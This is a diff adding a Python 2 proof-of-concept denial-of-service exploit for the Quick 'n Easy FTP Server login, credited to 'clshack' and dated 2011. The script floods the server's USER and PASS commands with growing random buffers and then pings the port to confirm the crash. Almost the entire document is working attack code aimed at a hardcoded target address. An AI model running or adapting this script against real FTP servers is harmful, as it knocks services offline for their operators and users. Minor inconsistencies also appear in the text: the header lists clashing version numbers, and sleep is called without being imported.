@@ -1,0 +1,43 @@
+# Exploit Title:[DOS LOGIN]  Quick 'n Easy FTP Server 3.2
+# Date:28/2/2011
+# Author: clshack
+# Software Link:
+http://www.pablosoftwaresolutions.com/html/quick__n_easy_ftp_server.html<http://downstairs.dnsalias.net/homeftpserver.html>
+# Version:1.12
+# Tested on: windows xp sp3 en
+# CVE :
+
+#!/usr/bin/python
+from ftplib import *
+import random
+import socket
+def ping(host,port):
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+        connect=s.connect((host,port));
+    except Exception ,e :
+        print e
+        return 0;
+    s.close();
+    return 1;
+
+host = "192.168.1.155"
+port = 21
+buffer="";
+while(len(buffer)<200000):
+    buffer+=chr(int(random.uniform(0,255)))*2+"?";
+    try:
+        ftp=FTP();
+        ftp.connect(host,port);
+        ftp.sendcmd("USER "+buffer)
+        ftp.sendcmd("PASS "+buffer)
+        ftp.quit();
+        ftp.close();
+        sleep(int(random.uniform(0,2)))
+    except Exception, e:
+        print e
+    if not ping(host,port):
+        print "Dos in Login credentials \n"
+        exit(-1)
+
+Twitter:clshackblog
